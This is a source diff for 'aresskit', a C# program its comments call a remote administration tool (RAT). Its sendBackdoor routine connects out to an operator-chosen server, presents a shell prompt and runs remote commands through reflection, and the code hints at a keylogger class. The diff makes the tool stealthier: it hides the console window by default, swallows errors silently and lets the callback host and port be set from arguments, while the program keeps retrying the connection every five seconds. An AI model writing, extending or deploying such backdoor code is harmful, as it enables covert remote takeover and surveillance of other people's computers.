@@ -10,8 +10,8 @@ namespace aresskit
     {
         const string server = "localhost";
         const int port = 9000;
-        const bool hideConsole = false;
-
+        const bool hideConsole = true;
+        
         private static void sendBackdoor(string server, int port)
         {
             try
@@ -22,10 +22,10 @@ namespace aresskit
 
                 while (true)
                 {
-                    byte[] shellcode = Toolkit.byteCode("aresskit> ");
+                    byte[] shellcode = Misc.byteCode("aresskit> ");
 
                     stream.Write(shellcode, 0, shellcode.Length); // Send Shellcode
-                    byte[] data = new byte[256]; byte[] output = Toolkit.byteCode("");
+                    byte[] data = new byte[256]; byte[] output = Misc.byteCode("");
 
                     // String to store the response ASCII representation.
 
@@ -46,10 +46,10 @@ namespace aresskit
                         foreach (Type x in theList)
                         {
                             if (x.Name != "<>c" && x.Name != "LowLevelKeyboardProc") // To rid away unused Classes
-                                helpMenu += Toolkit.ShowMethods(x) + "\n";
+                                helpMenu += Misc.ShowMethods(x) + "\n";
                         }
 
-                        output = Toolkit.byteCode(helpMenu);
+                        output = Misc.byteCode(helpMenu);
                     }
                     else
                     {
@@ -58,7 +58,7 @@ namespace aresskit
                             if (!responseData.Contains("::"))
                             {
                                 if (responseData != "")
-                                    output = Toolkit.byteCode("'" + responseData.Replace("\n", "") + "' is not a recognized command.\n");
+                                    output = Misc.byteCode("'" + responseData.Replace("\n", "") + "' is not a recognized command.\n");
                             }
                             else
                             {
@@ -74,7 +74,7 @@ namespace aresskit
                                 string[] methodData = classMethod[1].Split(new char[0]);
                                 MethodInfo methodInstance = methodType.GetMethod(methodData[0]);
                                 if (methodInstance == null)
-                                    output = Toolkit.byteCode("No such class/method with the name '" + classMethod[0] + "::" + classMethod[1] + "'");
+                                    output = Misc.byteCode("No such class/method with the name '" + classMethod[0] + "::" + classMethod[1] + "'");
                                 ParameterInfo[] methodParameters = methodInstance.GetParameters();
 
 
@@ -85,7 +85,7 @@ namespace aresskit
                                 {
                                     if (methodParameters.Length == 0)
                                     {
-                                        output = Toolkit.byteCode(methodInstance.Invoke(classInstance, null) + "\n");
+                                        output = Misc.byteCode(methodInstance.Invoke(classInstance, null) + "\n");
                                     }
                                     else
                                     {
@@ -95,7 +95,7 @@ namespace aresskit
                                                 parameterString += methodData[i] + " ";
                                             parameterArray[0] = parameterString;
                                         }
-                                        output = Toolkit.byteCode(methodInstance.Invoke(classInstance, parameterArray).ToString() + "\n");
+                                        output = Misc.byteCode(methodInstance.Invoke(classInstance, parameterArray).ToString() + "\n");
                                         // Console.WriteLine(methodInstance.Invoke(classInstance, parameterArray).ToString() + "\n");
                                     }
                                 }
@@ -103,7 +103,7 @@ namespace aresskit
                         }
                         catch (Exception e)
                         {
-                            output = Toolkit.byteCode(e.ToString() + "\n");
+                            output = Misc.byteCode(e.ToString() + "\n");
                         }
                     }
 
@@ -128,11 +128,9 @@ namespace aresskit
 
         static void Main(string[] args)
         {
-            var handle = GetConsoleWindow();
-
             // Hide Window
             if (hideConsole)
-                ShowWindow(handle, SW_HIDE);
+                Toolkit.HideWindow();
             
             // Fully featured Remote Administration Tool (RAT)
             /*
@@ -199,27 +197,21 @@ namespace aresskit
 
             while (true)
             {
-                if (toolkit.checkInternetConn("www.google.com") == true)
+                if (Network.checkInternetConn("www.google.com") == true)
                 {
                     try
                     {
-                        Console.WriteLine("Sending RAT terminal to: {0}, port: {1}", server, port);
-                        sendBackdoor(server, port);
+                        // Console.WriteLine("Sending RAT terminal to: {0}, port: {1}", server, port);
+                        if (args.Length != 0)
+                            sendBackdoor(args[0], int.Parse(args[1]));
+                        else
+                            sendBackdoor(server, port);
                     }
-                    catch (Exception e)
-                    { Console.WriteLine(e); } // pass silently
+                    catch (Exception)
+                    {} // pass silently
                 }
                 System.Threading.Thread.Sleep(5000); // sleep for 5 seconds before retrying
             }
         }
-
-        [DllImport("kernel32.dll")]
-        static extern IntPtr GetConsoleWindow();
-
-        [DllImport("user32.dll")]
-        static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
-
-        const int SW_SHOW = 1;
-        const int SW_HIDE = 0;
     }
 }
